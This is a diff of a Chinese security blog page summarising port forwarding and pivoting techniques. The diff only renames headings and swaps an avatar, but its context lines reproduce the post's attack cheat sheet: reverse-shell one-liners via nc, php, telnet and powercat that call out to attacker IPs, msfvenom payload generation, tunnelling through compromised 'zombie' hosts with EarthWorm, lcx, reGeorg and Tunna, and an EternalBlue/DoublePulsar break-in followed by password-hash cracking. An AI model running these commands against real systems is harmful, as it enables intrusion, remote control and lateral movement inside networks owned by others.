@@ -88,18 +88,18 @@
 
 
 
-<meta name="description" content="0x01 传统反弹与网络发现">
+<meta name="description" content="传统反弹与网络发现">
 <meta name="keywords" content="笔记,端口转发">
 <meta property="og:type" content="article">
 <meta property="og:title" content="端口转发总结">
 <meta property="og:url" content="https://sp4rr0w.github.io/2018/03/27/端口转发总结/index.html">
 <meta property="og:site_name" content="Sparrow&#39;s Blog">
-<meta property="og:description" content="0x01 传统反弹与网络发现">
+<meta property="og:description" content="传统反弹与网络发现">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-03-28T01:35:54.048Z">
+<meta property="og:updated_time" content="2018-03-28T07:28:56.825Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="端口转发总结">
-<meta name="twitter:description" content="0x01 传统反弹与网络发现">
+<meta name="twitter:description" content="传统反弹与网络发现">
 
 
 
@@ -311,7 +311,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Sparrow">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/jacksparrow.png">
+      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -421,7 +421,7 @@
       
 
       
-        <h2 id="0x01-传统反弹与网络发现"><a href="#0x01-传统反弹与网络发现" class="headerlink" title="0x01 传统反弹与网络发现"></a>0x01 传统反弹与网络发现</h2><a id="more"></a>
+        <h2 id="传统反弹与网络发现"><a href="#传统反弹与网络发现" class="headerlink" title="传统反弹与网络发现"></a>传统反弹与网络发现</h2><a id="more"></a>
 <p><strong>协议的判断</strong></p>
 <p>主要是看能够通过什么协议出去，主要有tcp\http\dns\icmp等协议。常见判断手法如下：</p>
 <p>tcp协议</p>
@@ -491,7 +491,7 @@ lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:co
 mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe
 
 php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
-</code></pre><h2 id="0x02-iptables"><a href="#0x02-iptables" class="headerlink" title="0x02 iptables"></a>0x02 iptables</h2><p>1、编辑配置文件/etc/sysctl.conf</p>
+</code></pre><h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>1、编辑配置文件/etc/sysctl.conf</p>
 <pre><code>net.ipv4.ip_forward = 1
 </code></pre><p>2、关闭服务</p>
 <pre><code>service iptables stop
@@ -501,7 +501,7 @@ php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt
 iptables -t nat -A POSTROUTING --dst 192.168.206.101 -p tcp --dport 3389 -j SNAT --to-source 192.168.206.129
 </code></pre><p>4、保存&amp;&amp;重启服务</p>
 <pre><code>service iptables save &amp;&amp; service iptables start
-</code></pre><h2 id="0x03-EarthWorm-绕防火墙"><a href="#0x03-EarthWorm-绕防火墙" class="headerlink" title="0x03 EarthWorm[绕防火墙]"></a>0x03 EarthWorm[绕防火墙]</h2><p><a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm/</a></p>
+</code></pre><h2 id="EarthWorm-绕防火墙"><a href="#EarthWorm-绕防火墙" class="headerlink" title="EarthWorm[绕防火墙]"></a>EarthWorm[绕防火墙]</h2><p><a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm/</a></p>
 <ol>
 <li><p>正向 SOCKS v5 服务器</p>
 <p> $ ./ew -s ssocksd -l 1080</p>
@@ -533,7 +533,7 @@ $ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
 $ ./ew -s lcx_listen -l 9999 -e 7777
 $ ./ew -s rssocks -d 127.0.0.1 -e 7777
 </code></pre><p>数据流向: SOCKS v5 -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</p>
-<h2 id="0x04-Shell反弹不出-DMZ"><a href="#0x04-Shell反弹不出-DMZ" class="headerlink" title="0x04 Shell反弹不出[DMZ]"></a>0x04 Shell反弹不出[DMZ]</h2><p>1、先生成一个bind_shell</p>
+<h2 id="Shell反弹不出-DMZ"><a href="#Shell反弹不出-DMZ" class="headerlink" title="Shell反弹不出[DMZ]"></a>Shell反弹不出[DMZ]</h2><p>1、先生成一个bind_shell</p>
 <pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=12345 -f exe -o ./shell.exe
 </code></pre><p>2、本地利用tunna工具进行端口转发</p>
 <pre><code>python proxy.py -u http://xxxx.com/conn.jsp  -l 3333 -r 12345 v
@@ -541,7 +541,7 @@ $ ./ew -s rssocks -d 127.0.0.1 -e 7777
 <pre><code>use exploit/multi/handler
 set payload windows/x64/meterpreter/bind_tcp
 set LPORT 3333
-</code></pre><h2 id="0x05-SSH隧道"><a href="#0x05-SSH隧道" class="headerlink" title="0x05 SSH隧道"></a>0x05 SSH隧道</h2><p>三种不同类型的ssh隧道</p>
+</code></pre><h2 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h2><p>三种不同类型的ssh隧道</p>
 <p><a href="http://hetaoo.iteye.com/blog/2299123" target="_blank" rel="noopener">http://hetaoo.iteye.com/blog/2299123</a></p>
 <p>通过VPS SSH隧道使用本地msf<br><a href="https://evi1cg.me/archives/Port_Forward_using_VPS_SSH_Tunnel.html" target="_blank" rel="noopener">https://evi1cg.me/archives/Port_Forward_using_VPS_SSH_Tunnel.html</a></p>
 <p>本地访问127.0.0.1:port1就是host:port2(用的更多)</p>
@@ -560,7 +560,7 @@ set LPORT 3333
 -f      #后台运行，推荐加-n参数
 -N      #不执行远程命令
 </code></pre><p>set RHOST 127.0.0.1</p>
-<h2 id="0x06-Netsh-tcp"><a href="#0x06-Netsh-tcp" class="headerlink" title="0x06 Netsh[tcp]"></a>0x06 Netsh[tcp]</h2><p>添加转发规则</p>
+<h2 id="Netsh-tcp"><a href="#Netsh-tcp" class="headerlink" title="Netsh[tcp]"></a>Netsh[tcp]</h2><p>添加转发规则</p>
 <pre><code>netsh interface portproxy set v4tov4 listenaddress=192.168.206.101 listenport=3333 connectaddress=192.168.206.100 connectport=3389
 
 此工具适用于，有一台双网卡服务器，你可以通过它进行内网通信，比如这个，你连接192.168.206.101:3388端口是连接到100上面的3389
@@ -570,7 +570,7 @@ set LPORT 3333
 <pre><code>netsh interface portproxy show all
 </code></pre><p>xp需要安装ipv6</p>
 <pre><code>netsh interface ipv6 install
-</code></pre><h2 id="0x07-nc-正向"><a href="#0x07-nc-正向" class="headerlink" title="0x07 nc [正向]"></a>0x07 nc [正向]</h2><pre><code>1、 nc -e /bin/sh -lp 1234
+</code></pre><h2 id="nc-正向"><a href="#nc-正向" class="headerlink" title="nc [正向]"></a>nc [正向]</h2><pre><code>1、 nc -e /bin/sh -lp 1234
     nc -e /bin/sh 223.8.200.234 1234
     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f 
     nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999
@@ -579,19 +579,19 @@ set LPORT 3333
     /bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe
 
 3、  nc.exe -e cmd.exe -lp 1234  [windows]
-</code></pre><h2 id="0x08-lcx-内网转发"><a href="#0x08-lcx-内网转发" class="headerlink" title="0x08 lcx 内网转发"></a>0x08 lcx 内网转发</h2><p>监听1234端口,转发数据到2333端口</p>
+</code></pre><h2 id="lcx-内网转发"><a href="#lcx-内网转发" class="headerlink" title="lcx 内网转发"></a>lcx 内网转发</h2><p>监听1234端口,转发数据到2333端口</p>
 <pre><code>本地:lcx.exe -listen 1234 6666
 </code></pre><p>将目标的3389转发到本地的1234端口</p>
 <pre><code>肉鸡:lcx.exe -slave my_ip 1234 127.0.0.1 3389
 </code></pre><p>re:最好有个vps</p>
-<h2 id="0x09-reGeorg"><a href="#0x09-reGeorg" class="headerlink" title="0x09 reGeorg"></a>0x09 reGeorg</h2><p><a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p>
+<h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p><a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p>
 <p>python reGeorgSocksProxy.py -p 4444 -u <a href="http://xxx.com/tunnel.php" target="_blank" rel="noopener">http://xxx.com/tunnel.php</a><br>vim /etc/proxychains.conf</p>
 <pre><code>socks5 127.0.0.1 4444
 </code></pre><p>proxychains4 nmap -sT -Pn -n 192.168.1.2</p>
-<h2 id="0x10-Tunna-速度较慢"><a href="#0x10-Tunna-速度较慢" class="headerlink" title="0x10 Tunna[速度较慢]"></a>0x10 Tunna[速度较慢]</h2><p><a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">https://github.com/SECFORCE/Tunna</a></p>
+<h2 id="Tunna-速度较慢"><a href="#Tunna-速度较慢" class="headerlink" title="Tunna[速度较慢]"></a>Tunna[速度较慢]</h2><p><a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">https://github.com/SECFORCE/Tunna</a></p>
 <pre><code>python proxy.py -u http://219.x.x.x/conn.jsp -l 1234 -r 3389 -v 
 rdesktop 127.0.0.1:1234
-</code></pre><h2 id="0x11-Linux-portmap-端口映射"><a href="#0x11-Linux-portmap-端口映射" class="headerlink" title="0x11 Linux portmap 端口映射"></a>0x11 Linux portmap 端口映射</h2><p>转发ssh到外网 不太常用</p>
+</code></pre><h2 id="Linux-portmap-端口映射"><a href="#Linux-portmap-端口映射" class="headerlink" title="Linux portmap 端口映射"></a>Linux portmap 端口映射</h2><p>转发ssh到外网 不太常用</p>
 <pre><code>./portmap -m 2 -p1 6666 -h2 8.8.8.8 -p2 7777    #先在外网执行
 ./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 8.8.8.8 -p2 6666  #在内网shell下执行
 ssh 127.0.0.1 -p 7777   #在外网机器上执行
@@ -629,7 +629,7 @@ vi /etc/sysctl.conf #将net.ipv4.ip_forward=0更改为net.ipv4.ip_forward=1 开�
 sysctl -p   #使数据转发功能生效
 iptables -t nat -A PREROUTING --dst 192.168.46.129 -p tcp --dport 81 -j DNAT --to-destination 172.24.20.25:80 #把本地192.168.46.129的81端口转为目标172,24.20.25的80端口
 iptables -t nat -A POSTROUTING --dst 172.24.20.25 -p tcp --dport 80  -j SNAT --to-source 192.168.46.129   #172.24.20.25:80返回时 将ip修改为192.168.46.129
-</code></pre><h2 id="0x12-端口转发之PowerShell"><a href="#0x12-端口转发之PowerShell" class="headerlink" title="0x12 端口转发之PowerShell"></a>0x12 端口转发之PowerShell</h2><p><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p>
+</code></pre><h2 id="端口转发之PowerShell"><a href="#端口转发之PowerShell" class="headerlink" title="端口转发之PowerShell"></a>端口转发之PowerShell</h2><p><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p>
 <pre><code>Victim IP : 192.168.52.1
 Attacker IP : 192.168.52.129
 </code></pre><p>1.Reverse shell[tcp]</p>
@@ -672,15 +672,15 @@ Victim:
 Victim:
     PS F:\Shells&gt; . .\powercat.ps1
     PS F:\Shells&gt; powercat -c 192.168.52.131 -v -dns shellcome.com -ep
-</code></pre><h2 id="0x13-metasploit"><a href="#0x13-metasploit" class="headerlink" title="0x13 metasploit"></a>0x13 metasploit</h2><pre><code>meterpreter&gt; run autoroute -s 192.168.1.0/24
+</code></pre><h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><pre><code>meterpreter&gt; run autoroute -s 192.168.1.0/24
 meterpreter&gt; use auxiliary/server/socks4a
 msf&gt; route add 192.168.1.0 255.255.255.0 192.168.1.1 [sessionid]
-</code></pre><h2 id="0x14-防火墙开启的ms17-010"><a href="#0x14-防火墙开启的ms17-010" class="headerlink" title="0x14 防火墙开启的ms17-010"></a>0x14 防火墙开启的ms17-010</h2><p>例如:详细查找ms17-010<br><a href="https://packetstormsecurity.com/search/?q=MS17-010" target="_blank" rel="noopener">https://packetstormsecurity.com/search/?q=MS17-010</a></p>
+</code></pre><h2 id="防火墙开启的ms17-010"><a href="#防火墙开启的ms17-010" class="headerlink" title="防火墙开启的ms17-010"></a>防火墙开启的ms17-010</h2><p>例如:详细查找ms17-010<br><a href="https://packetstormsecurity.com/search/?q=MS17-010" target="_blank" rel="noopener">https://packetstormsecurity.com/search/?q=MS17-010</a></p>
 <pre><code>1、上传EarthWorm转发端口445到指定端口,然后利用eternalblue+Doublepulsar溢出目标8888端口，成功回弹系统权限的shell
 2、由于防火墙限制（也可能其他），直接添加管理员始终不能成功
 3、上传工具，获取管理员密码hash破解，成功登陆3389
 ./ew -s lcx_tran -l 8888 -f 127.0.0.1-g 445
-</code></pre><h2 id="0x15-Socks代理工具"><a href="#0x15-Socks代理工具" class="headerlink" title="0x15 Socks代理工具"></a>0x15 Socks代理工具</h2><p>re. 使用方法    <a href="http://bobao.360.cn/learning/detail/3502.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3502.html</a></p>
+</code></pre><h2 id="Socks代理工具"><a href="#Socks代理工具" class="headerlink" title="Socks代理工具"></a>Socks代理工具</h2><p>re. 使用方法    <a href="http://bobao.360.cn/learning/detail/3502.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3502.html</a></p>
 <pre><code>Earthworm            http://rootkiter.com/EarthWorm
 xsocks            https://github.com/5loyd/xsocks
 ShadowSOCKS（影梭）    https://github.com/shadowSOCKS
@@ -801,7 +801,7 @@ proxychains        http://proxychains.sourceforge.net/
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
               <img class="site-author-image" itemprop="image"
-                src="/images/jacksparrow.png"
+                src="/images/avatar.gif"
                 alt="Sparrow" />
             
               <p class="site-author-name" itemprop="name">Sparrow</p>
@@ -893,7 +893,7 @@ proxychains        http://proxychains.sourceforge.net/
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-传统反弹与网络发现"><span class="nav-number">1.</span> <span class="nav-text">0x01 传统反弹与网络发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-iptables"><span class="nav-number">2.</span> <span class="nav-text">0x02 iptables</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-EarthWorm-绕防火墙"><span class="nav-number">3.</span> <span class="nav-text">0x03 EarthWorm[绕防火墙]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Shell反弹不出-DMZ"><span class="nav-number">4.</span> <span class="nav-text">0x04 Shell反弹不出[DMZ]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-SSH隧道"><span class="nav-number">5.</span> <span class="nav-text">0x05 SSH隧道</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Netsh-tcp"><span class="nav-number">6.</span> <span class="nav-text">0x06 Netsh[tcp]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-nc-正向"><span class="nav-number">7.</span> <span class="nav-text">0x07 nc [正向]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-lcx-内网转发"><span class="nav-number">8.</span> <span class="nav-text">0x08 lcx 内网转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-reGeorg"><span class="nav-number">9.</span> <span class="nav-text">0x09 reGeorg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-Tunna-速度较慢"><span class="nav-number">10.</span> <span class="nav-text">0x10 Tunna[速度较慢]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x11-Linux-portmap-端口映射"><span class="nav-number">11.</span> <span class="nav-text">0x11 Linux portmap 端口映射</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x12-端口转发之PowerShell"><span class="nav-number">12.</span> <span class="nav-text">0x12 端口转发之PowerShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x13-metasploit"><span class="nav-number">13.</span> <span class="nav-text">0x13 metasploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x14-防火墙开启的ms17-010"><span class="nav-number">14.</span> <span class="nav-text">0x14 防火墙开启的ms17-010</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x15-Socks代理工具"><span class="nav-number">15.</span> <span class="nav-text">0x15 Socks代理工具</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#传统反弹与网络发现"><span class="nav-number">1.</span> <span class="nav-text">传统反弹与网络发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#iptables"><span class="nav-number">2.</span> <span class="nav-text">iptables</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EarthWorm-绕防火墙"><span class="nav-number">3.</span> <span class="nav-text">EarthWorm[绕防火墙]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shell反弹不出-DMZ"><span class="nav-number">4.</span> <span class="nav-text">Shell反弹不出[DMZ]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSH隧道"><span class="nav-number">5.</span> <span class="nav-text">SSH隧道</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Netsh-tcp"><span class="nav-number">6.</span> <span class="nav-text">Netsh[tcp]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nc-正向"><span class="nav-number">7.</span> <span class="nav-text">nc [正向]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lcx-内网转发"><span class="nav-number">8.</span> <span class="nav-text">lcx 内网转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reGeorg"><span class="nav-number">9.</span> <span class="nav-text">reGeorg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tunna-速度较慢"><span class="nav-number">10.</span> <span class="nav-text">Tunna[速度较慢]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-portmap-端口映射"><span class="nav-number">11.</span> <span class="nav-text">Linux portmap 端口映射</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#端口转发之PowerShell"><span class="nav-number">12.</span> <span class="nav-text">端口转发之PowerShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#metasploit"><span class="nav-number">13.</span> <span class="nav-text">metasploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防火墙开启的ms17-010"><span class="nav-number">14.</span> <span class="nav-text">防火墙开启的ms17-010</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Socks代理工具"><span class="nav-number">15.</span> <span class="nav-text">Socks代理工具</span></a></li></ol></div>
             
 
           </div>
